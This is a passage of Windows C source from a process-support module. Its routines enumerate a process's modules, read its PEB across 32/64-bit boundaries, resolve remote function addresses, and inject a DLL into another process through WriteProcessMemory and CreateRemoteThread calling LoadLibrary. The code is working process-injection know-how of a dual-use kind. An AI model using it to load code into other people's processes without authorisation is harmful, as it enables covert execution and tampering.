	 SysModInfo = vAlloc(Size);

	 while (SysModInfo && !PsSupWow64QueyProcessModules64(hProcess, SysModInfo, Size, &bSize) && Size < bSize)
#endif
	 {
		 Size = bSize;
		 vFree(SysModInfo);
		 SysModInfo = vAlloc(Size);
	 }

	 if (SysModInfo && Size >= bSize)
	 {
		 ModInfo = &SysModInfo->aSM[0];
		 for (i=0; i<SysModInfo->uCount; i++)
		 {
			 PCHAR	Dot, ShortName = (PCHAR)&ModInfo->ImageName[ModInfo->ModuleNameOffset];

			 ASSERT(ModInfo->Index == i);
			 if (ModuleName == NULL || lstrcmpi(ShortName, ModuleName) == 0)
			 {
				 Status = NO_ERROR;
				 break;
			 }
			 if (Dot = strchr(ShortName, '.'))
			 {
				 Dot[0] = 0;
				 if (lstrcmpi(ShortName, ModuleName) == 0)
				 {
					 Status = NO_ERROR;
					 break;
				 }
			 }	// if (Dot = strchr(ShortName, '.'))
			 ModInfo += 1;
		 }	// for (i=0; i<SysModInfo->uCount; i++)

		 if (Status == NO_ERROR)
		 {
			 *pModuleBase = ModInfo->Base;
			 if (pModuleSize)
				 *pModuleSize = ModInfo->Size;
		 }
	 }	// if (SysModInfo && Size >= bSize)
	 else
		 Status = ERROR_NOT_ENOUGH_MEMORY;

	 if (SysModInfo)
		 vFree(SysModInfo);

	 return(Status);
 }



 //
 //	Returns address of a function from a 64-bit process when called forom WOW64 process.
 //
ULONG64	PsSupGetProcessFunctionAddressArch(
	HANDLE		hProcess,		// Handle to a process with PROCESS_QUERY_INFORMATION and PROCESS_VM_READ access
	PCHAR		ModuleName,		// short module name (case insensitive)
	PCHAR		FunctionName	// function name (case sensitive)
	)
 {
	 ULONG64	CurrentBase, DllBase, Function = 0;
	 ULONG		DllSize;
	 SIZE_T		bRead;
	 PCHAR		CurrentBuf, Module = NULL;
	 PEXPORT_ENTRY	ExpEntry;

	 do	// not a loop
	 {
		if (PsSupGetProcessModuleBaseArch(hProcess, ModuleName, &DllBase, &DllSize) != NO_ERROR)
			break;

		if (!(Module = (PCHAR)vAlloc(DllSize)))
			// Not enough memory
			break;

		CurrentBuf = Module;
		CurrentBase = DllBase;
	
		ASSERT((DllSize & ~(PAGE_SIZE - 1)) == DllSize);
	
		// Reading image page by page.
		// Reading whole image at once may sometimes fail, coz some pages within the image may be paged out.
		do 
		{
#ifdef _WIN64
			ReadProcessMemory(hProcess, (PVOID)CurrentBase, CurrentBuf, PAGE_SIZE, &bRead);
#else
			bRead = PsSupReadProcess64Memory(hProcess, &CurrentBase, CurrentBuf, PAGE_SIZE);
#endif
			DllSize -= PAGE_SIZE;
			CurrentBuf += PAGE_SIZE;
			CurrentBase += PAGE_SIZE;
		} while(DllSize);


		// Using exception handling here because the image read could be corrupt
		__try
		{
			if (ExpEntry = PeSupGetExportEntry((HMODULE)Module, FunctionName))
				Function = DllBase + *ExpEntry;		
		}
		__except(EXCEPTION_EXECUTE_HANDLER)
		{		
		}

	 }	while(FALSE);

	 if (Module)
		 vFree(Module);

	 return(Function);
 }


//
//	Returns process main module base.
//	This function doesn't enumerate process modules but, instead of this, takes image base from the PEB.
//	So, it's safe to be used during process initialization.
//
PVOID	PsSupGetProcessMainImageBase(
	HANDLE hProcess
	)
{
	NTSTATUS	ntStatus;
	PROCESS_BASIC_INFORMATION	BasicInfo;
	SIZE_T	bRead;
	PEB		Peb = {0};
	PVOID	ImageBase = NULL;

	ntStatus = ZwQueryInformationProcess(hProcess, ProcessBasicInformation, &BasicInfo, sizeof(PROCESS_BASIC_INFORMATION), (PULONG)&bRead);
	if (NT_SUCCESS(ntStatus))
	{
		if (ReadProcessMemory(hProcess, BasicInfo.PebBaseAddress, &Peb, sizeof(PEB), &bRead))
		{
			ASSERT(bRead == sizeof(PEB));
			ImageBase = Peb.ImageBaseAddress;
		}	// if (ReadProcessMemory(hProcess, BasicInfo.PebBaseAddress, &Peb, sizeof(PEB), &bRead))
	}	// if (NT_SUCCESS(ntStatus))
	
	return(ImageBase);
}


//
//	Returns process main module base of the process of other architecture then the caller.
//	This function doesn't enumerate process modules but, instead of this, takes image base from the PEB.
//	So, it's safe to be used during process initialization.
//
NTSTATUS	PsSupGetProcessMainImageBaseArch(
	HANDLE hProcess, 
	PVOID pImageBase
	)
{
	NTSTATUS	ntStatus;
	SIZE_T	bRead;

#ifdef _WIN64
	PEB32		Peb = {0};
	ULONG_PTR	ImageBase = 0;
	PROCESS_BASIC_INFORMATION	BasicInfo;

	ntStatus = ZwQueryInformationProcess(hProcess, ProcessBasicInformation, &BasicInfo, sizeof(PROCESS_BASIC_INFORMATION), (PULONG)&bRead);
	if (NT_SUCCESS(ntStatus))
	{
		if (ReadProcessMemory(hProcess, BasicInfo.PebBaseAddress, &Peb, sizeof(PEB32), &bRead))
		{
			ASSERT(bRead == sizeof(PEB32));
			ImageBase = (ULONG_PTR)Peb.ImageBaseAddress;
			*((ULONG_PTR*)pImageBase) = ImageBase;
		}	// if (ReadProcessMemory(hProcess, BasicInfo.PebBaseAddress, &Peb, sizeof(PEB32), &bRead))
		else
			ntStatus = STATUS_ACCESS_DENIED;
	}	// if (NT_SUCCESS(ntStatus))

#else
	PEB64		Peb = {0};
	ULONGLONG	ImageBase = 0;
	PROCESS_BASIC_INFORMATION64	BasicInfo;

	ntStatus = PsSupQueryProcess64Information(hProcess, ProcessBasicInformation, &BasicInfo, sizeof(PROCESS_BASIC_INFORMATION64), (PULONG)&bRead);
	if (NT_SUCCESS(ntStatus))
	{
		if (bRead = PsSupReadProcess64Memory(hProcess, &BasicInfo.PebBaseAddress, &Peb, sizeof(PEB64)))
		{
			ASSERT(bRead == sizeof(PEB64));
			ImageBase = Peb.ImageBaseAddress;
			*((ULONGLONG*)pImageBase) = ImageBase;
		}	//	if (bRead = PsSupReadProcess64Memory(hProcess, &BasicInfo.PebBaseAddress, &Peb, sizeof(PEB64)))
		else
			ntStatus = STATUS_ACCESS_DENIED;
	}	// if (NT_SUCCESS(ntStatus))
#endif
	
	return(ntStatus);
}



//
//	Frees specified memory buffer and allcoates a new one with specified size. Usually this one works faster then realloc().
//
_inline PVOID ReallocateBuffer(
	PVOID	Buf, 
	PULONG	cSize, 
	ULONG	Increment
	)
{
	hFree(Buf);
	*cSize += Increment;
	return((PVOID)hAlloc(*cSize));
}


//
//	Allocates an array and fills it with handles to all modules loaded into specified process. 
//	The caller is responsible for freeing the array. 
//
WINERROR PsSupGetProcessModules(
	HANDLE		hProcess,		// Process handle with PROCESS_QUERY_INFORMATION and PROCESS_VM_READ access rights
	HMODULE**	HandleArray,	// returned pointer to array of handle	
	ULONG*		NumberHandles	// returned number of handles in array
)
{
	WINERROR Status = ERROR_NOT_ENOUGH_MEMORY;
	ULONG bSize = BUFFER_INCREMENT;
	ULONG rSize = 0;
	BOOL Enum = FALSE;
	HMODULE* ModuleBuf = (HMODULE*)hAlloc(BUFFER_INCREMENT);

	while ((ModuleBuf) && (Enum = EnumProcessModules(hProcess, ModuleBuf, bSize, &rSize)) && (bSize <= rSize))
	{
		ModuleBuf = (HMODULE*)ReallocateBuffer(ModuleBuf, &bSize, BUFFER_INCREMENT);
	}

	if (ModuleBuf)
	{
		if (Enum)
		{
			*HandleArray = ModuleBuf;
			*NumberHandles = rSize / sizeof(HMODULE);
			Status = NO_ERROR;
		}
		else
		{
			Status = GetLastError();
			hFree(ModuleBuf);
		}
	}

	return(Status);
}


//
//	Returns base of the specified module loaded within the specified process.
//
 WINERROR PsSupGetProcessModuleBase(
	HANDLE		hProcess,		// Handle to process with PROCESS_QUERY_INFORMATION and PROCESS_VM_READ access
	LPTSTR		ModuleName,		// short module name (case insensitive) or NULL to receive process main module base
	HMODULE*	pModuleBase		// returned module base
	)
{
	WINERROR Status;
	ULONG Modules = 0;
	HMODULE* ModuleBuf = NULL;
	LPTSTR  ModulePath = NULL;
	ULONG rSize = 0;
	ULONG bSize = MAX_PATH;
	ULONG c;


	if ((Status = PsSupGetProcessModules(hProcess, &ModuleBuf, &Modules)) == NO_ERROR)
	{
		Status = ERROR_FILE_NOT_FOUND;
		ModulePath = (LPTSTR)hAlloc(MAX_PATH_BYTES);

		for (c=0; c<Modules; c++)
		{
			while ((ModulePath) && ((rSize = GetModuleFileNameEx(hProcess, ModuleBuf[c], ModulePath, bSize))!=0) && (bSize == rSize))
			{
				bSize += MAX_PATH;
				hFree(ModulePath);
				ModulePath = (LPTSTR)hAlloc(bSize*sizeof(_TCHAR));
			}

			if (ModulePath)
			{
				if (rSize)
				{
					LPTSTR ShortName = (_tcsrchr((LPTSTR)ModulePath, 0x5c))+1;
					
					if (ModuleName == NULL || lstrcmpi(ShortName, ModuleName) == 0)
					{
						*pModuleBase = ModuleBuf[c];
						Status = NO_ERROR;
						break;
					}
				}
			}
			else	
			{
				Status = ERROR_NOT_ENOUGH_MEMORY;
				break;
			}
		}	// for (ULONG c=0;c<Modules;c++)

		if (ModulePath)
			hFree(ModulePath);

		hFree(ModuleBuf);
	}

	return(Status);
}


//
//	This function used to be injected into target process before DLL inject to map target processes PEB.
//
ULONG GetPeb(
	PVOID Param
	)
{
#ifdef _M_IX86
	PULONG Peb = (PULONG)((ULONG_PTR)__readfsdword(0x30));
#else
	PULONG Peb = (PULONG)((ULONG_PTR)__readgsqword(0x30));
#endif
	
	return(*Peb);

	UNREFERENCED_PARAMETER(Param);
}


#define PEB_FUNC_SIZE	0x100

static WINERROR  ResolveKernelFunctionAddress(
								HANDLE		hProcess, 
								PCHAR		FunctionName, 
								ULONG		Flags, 
								PVOID		pFunction
								)
{
	WINERROR	Status = NO_ERROR;
	HMODULE		hKernel32 = GetModuleHandleA(g_Kernel32);
	ULONG_PTR	Function = (ULONG_PTR)GetLoadLibraryPtr();

#ifdef _WIN64
	if (LOBYTE(LOWORD(GetVersion())) >= 6)	
	{
		// For Vista and higher:
		// there's ASLR enabled by default, so we have to recalculate target function address according to 
		//  current kernel32 base within target process.
		// But we can't do it if the target process was just started suspended, coz target PEB is still paged out.
		// For this reason we first inject our GetPeb function, that accesses PEB within target process and maps it.
		//
		PVOID ProcessMem;
	

		if (Flags & INJECT_MAP_PEB)
		{
			if (ProcessMem = VirtualAllocEx(hProcess, NULL, PEB_FUNC_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE))
			{
				SIZE_T wBytes = 0;
				PVOID SrcFunc = &GetPeb;
				
				if (WriteProcessMemory(hProcess, ProcessMem, SrcFunc, PEB_FUNC_SIZE, &wBytes))
				{
					ULONG ThreadId;
					HANDLE RemoteThread = CreateRemoteThread(hProcess, NULL, 0x1000, (LPTHREAD_START_ROUTINE) ProcessMem, 0, 0, &ThreadId);
					if (RemoteThread)
					{
						WaitForSingleObject(RemoteThread, INFINITE);
						CloseHandle(RemoteThread);
					}
					else
					{
						Status = GetLastError();
						DbgPrint("PsSup: Cannot create a PEB mapping thread.\n");
					}
			
				}
				else
				{
					Status = GetLastError();
					DbgPrint("PsSup: Cannot write a target process memory.\n");
				}
			}
			else
			{
				Status = GetLastError();
				DbgPrint("PsSup: Cannot allocate a memory within target process.\n");
			}
		}	// if (Flags & INJECT_MAP_PEB)
	}	// if (LOBYTE(LOWORD(GetVersion())) >= 6)	

	if (Status == NO_ERROR)
	{
		ULONG_PTR newKernel32; 

		if (Flags & INJECT_ARCH_X64)
		{
			// Resolving native 64-bit function address.
			if ((Status = PsSupGetProcessModuleBase(hProcess, g_Kernel32,(HMODULE*)&newKernel32)) == NO_ERROR)
				Function = Function - (ULONG_PTR)hKernel32 + newKernel32;
		}
		else
			// Resolving WOW64 function address.
			Function = PsSupGetProcessFunctionAddressArch(hProcess, g_Kernel32, FunctionName);
	}	// if (Status == NO_ERROR)

#endif
	
	if (Status == NO_ERROR)
		*(ULONG_PTR*)pFunction = Function;

	return(Status);
}



static WINERROR PsSupInjectSameArch(
	HANDLE	hProcess,	// handle of the target process
	LPTSTR	DllPath,	// Full path to the DLL should be injected
	ULONG	Flags		// Inject flags
	)
{
	WINERROR	Status = ERROR_UNSUCCESSFULL;
	ULONG		ThreadId, NameLenBytes = ((ULONG)lstrlen(DllPath)+1)*sizeof(_TCHAR);
	PVOID		ProcessMem;
	SIZE_T		wBytes = 0;
	ULONG_PTR	pLoadLibrary = 0;
	HANDLE		RemoteThread = 0;

	do	// not a loop
	{
#ifdef _UNICODE
		Status = ResolveKernelFunctionAddress(hProcess, "LoadLibraryW", Flags, &pLoadLibrary);
#else
		Status = ResolveKernelFunctionAddress(hProcess, szLoadLibraryA, Flags, &pLoadLibrary);
#endif
		if (Status != NO_ERROR)
			break;

		Status = ERROR_UNSUCCESSFULL;

		if (!ReadProcessMemory(hProcess, (PVOID)pLoadLibrary, &wBytes, sizeof(ULONG), &wBytes))
			// This may rearly happen that LoadLibraryA within current process was hooked either by SHIM or any other way.
			// That's why we have to check if the specified address present within the target process.
			break;

		if (!(ProcessMem = VirtualAllocEx(hProcess, NULL, NameLenBytes, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)))
			break;

		if (!(WriteProcessMemory(hProcess, ProcessMem, DllPath, NameLenBytes, &wBytes)))
			break;

		RemoteThread = CreateRemoteThread(hProcess, NULL, 0x1000, (LPTHREAD_START_ROUTINE) pLoadLibrary, ProcessMem, 0, &ThreadId);
		if (!RemoteThread)
			break;

		WaitForSingleObject(RemoteThread, INFINITE);

		CloseHandle(RemoteThread);
		Status = NO_ERROR;
	} while(FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	return(Status);
}


//
//	Injects the specified DLL into the address space of the specified target process.
//
WINERROR PsSupInjectDll(
	ULONG	ProcessId,	// Process ID of the target process
	LPTSTR	DllPath,	// Full path to the DLL should be injected
	ULONG	Flags		// Inject flags
	)
{
	HANDLE hProcess;
	WINERROR Status = NO_ERROR;

	hProcess = 
		OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
					FALSE, 
					ProcessId
					);

	if (hProcess)
	{	
		// Injecting from 32-bit to 32-bit or from 64-bit to 64-bit process.
		Status = PsSupInjectSameArch(hProcess, DllPath, Flags);
		CloseHandle(hProcess);
	}	// if (hProcess)
	else
	{
		Status = GetLastError();
		DbgPrint("PsSup: Unable to open target process, error: %u.\n", Status);
	}
	
	return(Status);
}



//
//	Returns a full path to the module of the current process specified by handle.
//
WINERROR PsSupGetModulePath(
	HMODULE		hModule,		// a handle of the module within current process
	LPTSTR*		pModulePath		// returned module path
)
{
	WINERROR Status = NO_ERROR;
	ULONG bSize = MAX_PATH;
	ULONG rSize = 0;
	LPTSTR ModulePath = (LPTSTR)hAlloc(MAX_PATH_BYTES);

	while ((ModulePath) && ((rSize = GetModuleFileName(hModule, ModulePath, bSize))!=0) && (bSize == rSize))
	{
		bSize += MAX_PATH;
		hFree(ModulePath);
		ModulePath = (LPTSTR)hAlloc(bSize*sizeof(_TCHAR));
	}

	if (ModulePath)
	{
		if (rSize)
		{
			*pModulePath = ModulePath;
		}
		else
		{
			Status = GetLastError();
			hFree(ModulePath);
		}
	}
	else
		Status = ERROR_NOT_ENOUGH_MEMORY;

	return(Status);
}


//
//	Allocates a buffer and loads the specified file into it.
//
WINERROR PsSupLoadFile(
	LPTSTR	FileName,	// full path to the file to load
	PCHAR*	pBuffer,	// receives a pointer to the buffer containing the loaded file
	PULONG	pSize		// receives the size of the loaded file in bytes
	)
{
	WINERROR Status = ERROR_UNSUCCESSFULL;
	HANDLE	hFile;
	ULONG	Size, bRead;
	PCHAR	Buffer = NULL;

	do	// not a loop
	{
		hFile = CreateFile(FileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (hFile == INVALID_HANDLE_VALUE)
			break;
	
		if ((Size = GetFileSize(hFile, NULL)) == 0)
		{
			Status = ERROR_NO_DATA;
			break;
		}

		// Allocating a buffer with one extra char at the end for a NULL-char to be able to work with a text file.
		if (!(Buffer = hAlloc(Size + sizeof(_TCHAR))))
			break;
			
		if (!ReadFile(hFile, Buffer, Size, &bRead, NULL))
			break;

		if (Size != bRead)
		{
			Status = ERROR_READ_FAULT;
			break;
		}

		Buffer[Size] = 0;

		*pBuffer = Buffer;
		*pSize = Size;
		Status = NO_ERROR;
	} while(FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);

	if (Buffer && (Status != NO_ERROR))
		hFree(Buffer);

	return(Status);
}


WINERROR PsSupSuspendProcess(HANDLE hProcess)
{
	return(RtlNtStatusToDosError(NtSuspendProcess(hProcess)));
	
}

WINERROR PsSupResumeProcess(HANDLE hProcess)
{
	return(RtlNtStatusToDosError(NtResumeProcess(hProcess)));
}

 //
 //	Returns name of the current desktop for the specified processes.
 //
 PWSTR	PsSupGetProcessDesktopName(
	HANDLE hProcess 
	)
 {
	 NTSTATUS	ntStatus = STATUS_SUCCESS;
	 SIZE_T	bRead;
	 PROCESS_PARAMETERS ProcessParameters;
	 LPWSTR Desktop = NULL;

#ifndef _WIN64
	if ( PsSupIsWow64Process(0, hProcess) == FALSE )
#endif
	{
#ifndef _WIN64
		PEB32		Peb = {0};
#else
		PEB64		Peb = {0};
#endif
		 ULONG_PTR	ImageBase = 0;
		 PROCESS_BASIC_INFORMATION	BasicInfo;

		 ntStatus = ZwQueryInformationProcess(hProcess, ProcessBasicInformation, &BasicInfo, sizeof(PROCESS_BASIC_INFORMATION), (PULONG)&bRead);
		 if (NT_SUCCESS(ntStatus))
		 {
			 if (ReadProcessMemory(hProcess, BasicInfo.PebBaseAddress, &Peb, sizeof(Peb), &bRead))
			 {
				 ASSERT(bRead == sizeof(Peb));
				 ImageBase = (ULONG_PTR)Peb.ImageBaseAddress;
				
				 if (ReadProcessMemory(hProcess, (PVOID)(ULONG_PTR)Peb.ProcessParameters, &ProcessParameters, sizeof(ProcessParameters), &bRead))
				 {
					 Desktop = (LPWSTR) hAlloc(ProcessParameters.Desktop.Length + 2);
					 if ( Desktop )
					 {
						 if (ReadProcessMemory(hProcess, ProcessParameters.Desktop.Buffer, Desktop, ProcessParameters.Desktop.Length, &bRead))
						 {
							 Desktop[ProcessParameters.Desktop.Length/sizeof(WCHAR)] = 0;
						 }else{
							 hFree( Desktop );
							 Desktop = NULL;
						 }
					 }
				 } 
			 }	// if (ReadProcessMemory(hProcess, BasicInfo.PebBaseAddress, &Peb, sizeof(PEB32), &bRead))
			 else
				 ntStatus = STATUS_ACCESS_DENIED;
		 }	// if (NT_SUCCESS(ntStatus))
	} 
#ifndef _WIN64
	else
	{
		 PEB64		Peb = {0};
		 ULONGLONG	ImageBase = 0;
		 PROCESS_BASIC_INFORMATION64	BasicInfo;

		 ntStatus = PsSupQueryProcess64Information(hProcess, ProcessBasicInformation, &BasicInfo, sizeof(PROCESS_BASIC_INFORMATION64), (PULONG)&bRead);
		 if (NT_SUCCESS(ntStatus))
		 {
			 if (bRead = PsSupReadProcess64Memory(hProcess, &BasicInfo.PebBaseAddress, &Peb, sizeof(PEB64)))
			 {
				 ASSERT(bRead == sizeof(PEB64));
				 if (PsSupReadProcess64Memory(hProcess, (PULONG64)Peb.ProcessParameters, &ProcessParameters, sizeof(ProcessParameters)))
				 {
					 Desktop = (LPWSTR) hAlloc(ProcessParameters.Desktop.Length + 2);
					 if ( Desktop )
					 {
						 if (PsSupReadProcess64Memory(hProcess, (PULONG64)ProcessParameters.Desktop.Buffer, Desktop, ProcessParameters.Desktop.Length))
						 {
							 Desktop[ProcessParameters.Desktop.Length/sizeof(WCHAR)] = 0;
						 }else{
							 hFree( Desktop );
							 Desktop = NULL;
						 }
					 }
				 } 
			 }	//	if (bRead = PsSupReadProcess64Memory(hProcess, &BasicInfo.PebBaseAddress, &Peb, sizeof(PEB64)))

		 }	// if (NT_SUCCESS(ntStatus))
	}
#endif
	 return Desktop;
 }
